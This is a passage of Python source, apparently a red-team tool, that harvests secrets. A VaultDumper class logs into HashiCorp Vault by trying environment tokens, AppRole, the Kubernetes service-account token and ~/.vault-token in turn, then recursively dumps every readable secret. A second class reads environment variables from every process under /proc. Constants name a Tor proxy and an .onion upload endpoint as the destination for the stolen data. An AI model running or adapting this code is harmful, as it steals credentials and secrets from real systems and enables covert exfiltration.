from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VAULT_ADDR = os.environ.get('VAULT_ADDR', 'http://127.0.0.1:8200')
VAULT_TOKEN = os.environ.get('VAULT_TOKEN', '')
VAULT_ROLE_ID = os.environ.get('VAULT_ROLE_ID', '')
VAULT_SECRET_ID = os.environ.get('VAULT_SECRET_ID', '')
VAULT_K8S_ROLE = os.environ.get('VAULT_K8S_ROLE', '')
VAULT_K8S_TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'

TOR_PROXY = 'socks5h://127.0.0.1:9050'
ONION_ENDPOINT = 'http://vaultdumpxxxxxxxxxxxxxxxx.onion/upload'
ENCRYPTION_KEY = b'redteam-engagement-fixed-key-32b'

class VaultDumper:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.client_token = None
        self.secrets = {}

    def authenticate(self):
        if VAULT_TOKEN:
            self.client_token = VAULT_TOKEN
            self.session.headers.update({'X-Vault-Token': self.client_token})
            return True

        if VAULT_ROLE_ID and VAULT_SECRET_ID:
            try:
                resp = self.session.post(
                    f"{VAULT_ADDR}/v1/auth/approle/login",
                    json={'role_id': VAULT_ROLE_ID, 'secret_id': VAULT_SECRET_ID}
                )
                if resp.status_code == 200:
                    self.client_token = resp.json()['auth']['client_token']
                    self.session.headers.update({'X-Vault-Token': self.client_token})
                    return True
            except:
                pass

        if VAULT_K8S_ROLE:
            try:
                with open(VAULT_K8S_TOKEN_PATH, 'r') as f:
                    jwt = f.read().strip()
                resp = self.session.post(
                    f"{VAULT_ADDR}/v1/auth/kubernetes/login",
                    json={'role': VAULT_K8S_ROLE, 'jwt': jwt}
                )
                if resp.status_code == 200:
                    self.client_token = resp.json()['auth']['client_token']
                    self.session.headers.update({'X-Vault-Token': self.client_token})
                    return True
            except:
                pass

        try:
            with open(os.path.expanduser('~/.vault-token'), 'r') as f:
                token = f.read().strip()
            self.client_token = token
            self.session.headers.update({'X-Vault-Token': self.client_token})
            resp = self.session.get(f"{VAULT_ADDR}/v1/auth/token/lookup-self")
            if resp.status_code == 200:
                return True
        except:
            pass

        return False

    def list_mounts(self):
        try:
            resp = self.session.get(f"{VAULT_ADDR}/v1/sys/mounts")
            if resp.status_code == 200:
                return resp.json().get('data', {})
        except:
            pass
        return {}

    def list_path(self, path):
        try:
            resp = self.session.request('LIST', f"{VAULT_ADDR}/v1/{path}")
            if resp.status_code == 200:
                return resp.json().get('data', {}).get('keys', [])
        except:
            pass
        return []

    def read_secret(self, path):
        try:
            resp = self.session.get(f"{VAULT_ADDR}/v1/{path}")
            if resp.status_code == 200:
                return resp.json().get('data', {})
        except:
            pass
        return {}

    def recursive_dump(self, path, mount_type):
        keys = self.list_path(path)

        if not keys:
            data = self.read_secret(path)
            if data:
                self.secrets[f"{mount_type}/{path}"] = data
            return

        for key in keys:
            full_path = f"{path}/{key}" if path else key
            self.recursive_dump(full_path, mount_type)

    def dump_all(self):
        mounts = self.list_mounts()

        for mount_path, mount_info in mounts.items():
            mount_type = mount_info.get('type', 'unknown')
            clean_path = mount_path.strip('/')

            if mount_type == 'kv' or mount_type == 'kv-v2':
                self.recursive_dump(clean_path, mount_type)
            elif mount_type == 'cubbyhole':
                self.recursive_dump('cubbyhole', mount_type)
            elif mount_type == 'secret':
                self.recursive_dump(clean_path, mount_type)

        return self.secrets

class ProcessEnvCollector:
    def __init__(self):
        self.env_data = {}

    def collect_current_env(self):
        self.env_data['current_process'] = dict(os.environ)

    def collect_parent_env(self):
        try:
            ppid = os.ppid()
            env_path = f"/proc/{ppid}/environ"
            if os.path.exists(env_path):
                with open(env_path, 'r') as f:
                    env_raw = f.read()
                    for item in env_raw.split('\x00'):
                        if '=' in item:
                            key, value = item.split('=', 1)
                            self.env_data.setdefault(f'parent_{ppid}', {})[key] = value
        except:
            pass

    def collect_all_proc_env(self):
        for pid_dir in Path('/proc').glob('[0-9]*'):
            try:
                pid = pid_dir.name
                env_path = pid_dir / 'environ'
                if env_path.exists():
                    with open(env_path, 'r') as f:
                        env_raw = f.read()
                        proc_env = {}
                        for item in env_raw.split('\x00'):
                            if '=' in item:
                                key, value = item.split('=', 1)
                                proc_env[key] = value
                        if proc_env:
                            cmdline_path = pid_dir / 'cmdline'
                            cmdline = ''
                            if cmdline_path.exists():
                                with open(cmdline_path, 'r') as cf:
                                    cmdline = cf.read().replace('\x00', ' ').strip()
                            self.env_data[f'pid_{pid}_{cmdline[:50]}'] = proc_env
            except:
                continue

    def collect_all(self):
        self.collect_current_env()
        self.collect_parent_env()
        self.collect_all_proc_env()
        return self.env_data

